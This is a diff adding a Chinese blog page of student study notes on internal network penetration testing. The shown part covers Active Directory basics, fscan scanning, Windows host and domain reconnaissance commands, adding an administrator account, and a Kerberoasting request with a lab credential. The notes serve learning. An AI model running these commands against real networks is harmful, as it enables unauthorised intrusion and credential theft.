@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透学习">
+<meta property="og:url" content="https://mayylu.github.io/2024/07/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1423.1.png">
+<meta property="article:published_time" content="2024-07-10T04:44:19.000Z">
+<meta property="article:modified_time" content="2024-09-02T08:28:14.373Z">
+<meta property="article:author" content="mayylu">
+<meta property="article:tag" content="server">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2024/07/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2024/07/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/","path":"2024/07/10/server/内网渗透学习/","title":"内网渗透学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内网渗透学习 | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">2.</span> <span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-DC"><span class="nav-number">2.1.</span> <span class="nav-text">域控制器(DC)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD"><span class="nav-number">2.2.</span> <span class="nav-text">活动目录(AD)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84"><span class="nav-number">2.3.</span> <span class="nav-text">组</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">本机基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.2.</span> <span class="nav-text">域内基础信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN"><span class="nav-number">3.2.1.</span> <span class="nav-text">SPN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BloodHound"><span class="nav-number">3.2.2.</span> <span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.3.</span> <span class="nav-text">内网资源探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.3.1.</span> <span class="nav-text">发现内网存活主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.3.2.</span> <span class="nav-text">内网端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">Nmap进行端口扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="nav-number">3.4.</span> <span class="nav-text">收集用户凭证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="nav-number">3.4.1.</span> <span class="nav-text">本地用户的密码哈希</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mimikatz%E8%AF%BB%E5%8F%96"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">mimikatz读取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3"><span class="nav-number">3.4.1.2.</span> <span class="nav-text">离线破解</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E5%BA%94%E7%94%A8%E4%B8%AD%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-number">3.4.2.</span> <span class="nav-text">从应用中获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3xshell"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">破解xshell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">4.</span> <span class="nav-text">内网穿透与端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="nav-number">4.1.</span> <span class="nav-text">ssh隧道搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lcx"><span class="nav-number">4.2.</span> <span class="nav-text">lcx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chisel"><span class="nav-number">4.3.</span> <span class="nav-text">chisel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stowaway"><span class="nav-number">4.4.</span> <span class="nav-text">Stowaway</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">4.5.</span> <span class="nav-text">frp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux"><span class="nav-number">5.1.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.1.</span> <span class="nav-text">SUID提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Capabilities"><span class="nav-number">5.1.2.</span> <span class="nav-text">Capabilities</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUDO%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.3.</span> <span class="nav-text">SUDO滥用提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.4.</span> <span class="nav-text">脏牛提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#win"><span class="nav-number">5.2.</span> <span class="nav-text">win</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.1.</span> <span class="nav-text">烂土豆提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.2.</span> <span class="nav-text">注册表提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6"><span class="nav-number">5.2.3.</span> <span class="nav-text">远程桌面控制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-UDF%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.1.</span> <span class="nav-text">mysql UDF提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91"><span class="nav-number">6.</span> <span class="nav-text">域内横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IPC-amp-at-amp-schticks"><span class="nav-number">6.1.</span> <span class="nav-text">IPC$ &amp; at &amp; schticks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#at-amp-schtasks-%E4%BD%BF%E7%94%A8"><span class="nav-number">6.1.1.</span> <span class="nav-text">at &amp; schtasks 使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-Kerberos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE"><span class="nav-number">6.2.</span> <span class="nav-text">windows Kerberos身份认证协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-number">6.2.1.</span> <span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HASH%E4%BC%A0%E9%80%92%EF%BC%88PTH%EF%BC%89"><span class="nav-number">6.2.1.1.</span> <span class="nav-text">HASH传递（PTH）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DCsync%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7hash"><span class="nav-number">6.2.1.2.</span> <span class="nav-text">DCsync攻击获取域内用户hash</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#writeDacl%E6%9D%83%E9%99%90"><span class="nav-number">6.2.1.2.1.</span> <span class="nav-text">writeDacl权限</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PTH-%E7%9A%84%E9%99%90%E5%88%B6-UAC"><span class="nav-number">6.2.1.2.2.</span> <span class="nav-text">PTH 的限制 UAC</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-number">6.2.1.3.</span> <span class="nav-text">域内用户枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="nav-number">6.2.1.4.</span> <span class="nav-text">密码喷洒</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AS-REP-Roasting"><span class="nav-number">6.2.1.5.</span> <span class="nav-text">AS-REP Roasting</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.2.1.6.</span> <span class="nav-text">黄金票据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-number">6.2.2.</span> <span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A7%94%E6%89%98%E6%94%BB%E5%87%BB"><span class="nav-number">6.2.2.1.</span> <span class="nav-text">委托攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">6.2.2.1.1.</span> <span class="nav-text">非约束性委派</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">6.2.2.1.2.</span> <span class="nav-text">约束委派</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE-RBCD"><span class="nav-number">6.2.2.1.3.</span> <span class="nav-text">基于资源的约束性委派(RBCD)</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.2.2.2.</span> <span class="nav-text">白银票据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="nav-number">6.2.3.</span> <span class="nav-text">第三部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8D%8F%E8%AE%AE"><span class="nav-number">6.3.</span> <span class="nav-text">NTLM 身份验证协议协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E9%97%B4%E6%A8%AA%E5%90%91"><span class="nav-number">7.</span> <span class="nav-text">域间横向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">8.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF"><span class="nav-number">8.1.</span> <span class="nav-text">后门技术</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">学习是一种生活态度</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2024/07/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="学习是一种生活态度">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-07-10 12:44:19" itemprop="dateCreated datePublished" datetime="2024-07-10T12:44:19+08:00">2024-07-10</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2024-09-02 16:28:14" itemprop="dateModified" datetime="2024-09-02T16:28:14+08:00">2024-09-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍</p>
+<span id="more"></span>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h3><p>域控制器是域环境中核心的服务器计算机，用于在域中响应安全身份验证请求，负责允许或拒绝发出请求<br>的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息并执行域的安全策略等。</p>
+<p><strong>辅域</strong>：通常指的是在网络环境中作为主域控制器备份的域控制器。这些控制器在功能上辅助主域控制器，确保在主域控制器故障时能够接管关键服务</p>
+<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h3><p>活动目录是一种目录服务数据库，区别于常见的关系型数据库。目录数据库实现是目录服务，是一个帮助<br>用户快速，准确地从目录中找到所需要信息的服务。目录数据库将所有数据库组织成一个有层次的树状结<br>构，其中的每一个节点是一个对象，用户可以根据这个对象名称去查找这个对象的有关信息。<br>如果那台机器装了AD他就变成DC</p>
+<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>从组的使用范围来分，可以分为三种：全局组、本地域组和通用组。</p>
+<ol>
+<li>域本地组 域本地组主要用于本域内资源的访问权限，如<strong>Administrators：管理员组</strong>,该组的成员对服务器具有完全的控制权，并可以根据需要向用户分配用户权限和访问控制权限。<strong>administrator帐户</strong>是该组的一个默认成员,<strong>Account Operators</strong>：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器</li>
+<li>通用组   可以在该域林的任何域中指派权限，适合在域森林内的跨域访问中使用。</li>
+<li>全局组   全局组只能包含本域内的用户账户，全局组的使用范围是本域以及受信任关系的其他域。如Domain Admins，域管理员组，Domain Users，域用户</li>
+</ol>
+<p>当服务器加入域时，<strong>域管理员</strong>默认对域内所有机器都具有管理权限，这是因为域的<strong>Domain Admins组</strong>默认会被添加到域内所有机器的本地<strong>Administrators组内</strong>。因为此组可以完全控制服务器</p>
+<p>域用户账户是在域内全局组 <strong>Domain Users组</strong>中，本地用户账户在本地 <strong>User组</strong>中。当计算机加入域时，会把 Domain Users组添加到本地的 User 组中。因此域用户默认可以在域中的任何一台计算机上登录</p>
+<p>机器用户属于域的<strong>Domain Computers组</strong>。‌机器用户是一种特殊的域用户，用户名为机器名加<code>$</code>，如：<code>WIN7$</code>、<code>WINXP$</code>,win的SYSTEM权限就对应于主机的机器用户(system和administrator权限感觉都差不多，但在一些与系统内核交互的细节上，可以看出system权限要更大一些，如<strong>HKEY_LOCAL_MACHINE\SAM</strong>)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一般实战都是直接上传fscan</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 172.22.1.0/24</span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure>
+<h3 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM对应是: %SystemRoot%\system32\config\SYSTEM</span><br><span class="line">【system系统注册表文件，存储了系统的配置信息】</span><br><span class="line">HKLM\SAM对应是: %SystemRoot%\system32\config\SAM</span><br><span class="line">【SAM文件是Windows用户的账户数据库】</span><br><span class="line">HKLM\SECURITY对应是:</span><br><span class="line">%SystemRoot%\system32\config\ SECURITY</span><br><span class="line">【security中存储了Lsass策略数据库】</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">systeminfo    #查看操作系统信息 </span><br><span class="line">whoami /all   #查看当前用户，权限</span><br><span class="line"></span><br><span class="line">ipconfig /all #查看网络配置信息,linux是ifconfig</span><br><span class="line">netstat -ano  #查看端口连接信息</span><br><span class="line">route print   #查看主机路由信息</span><br><span class="line"></span><br><span class="line">tasklist      #查看当前进程</span><br><span class="line"></span><br><span class="line">net use       # 查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session   #查看当前主机与所连接的客户端之间的会话, 注意这里需要管理权限</span><br><span class="line">net share                             # 查看本地开启的共享</span><br><span class="line">net share ipc$                        # 开启ipc$共享</span><br><span class="line">net share ipc$ /del                   # 删除ipc$共享</span><br><span class="line">net share admin$ /del                 # 删除admin$共享</span><br><span class="line">net share c$ /del                     # 删除C盘共享</span><br><span class="line"></span><br><span class="line">net user      #查看本地用户/组信息</span><br><span class="line">net user &lt;用户名&gt; &lt;密码&gt; /add</span><br><span class="line">net user &lt;用户名&gt; /delete</span><br><span class="line"></span><br><span class="line">net localgroup administrators #查看本地管理员组</span><br><span class="line">net localgroup administrators fushuling /add #添加用户到该组</span><br><span class="line"></span><br><span class="line">query user #查看在线用户</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h3><p>需要有域用户的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net config workstation   #判断是否存在域环境</span><br><span class="line">net time /domain</span><br><span class="line">net user /domain         #域用户信息</span><br><span class="line">net group /domain        #列出域内所有用户组</span><br><span class="line">net group &quot;domain admins&quot; /domain #查看域管组</span><br><span class="line"></span><br><span class="line">net accounts /domain     #域内密码策略</span><br><span class="line">nltest /DCLIST:域名      #查询所有的域控制器的主机名</span><br><span class="line">nltest /domain_trusts    #查看域信任关系</span><br></pre></td></tr></table></figure>
+<h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><p>SPN（ServicePrincipal Names，服务主体名称）是服务实例的唯一标识符，当域内存在大量的服务器，管理员为了方便管理会对服务器进行标识，那么管理员标识所使用的方法就是SPN。<br>SPN分为以下两种类型，一种为注册在活动目录的“机器账户computer”下，另一种为注册在活动目录的“域账号Users”下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找域用户下的spn</span></span><br><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>
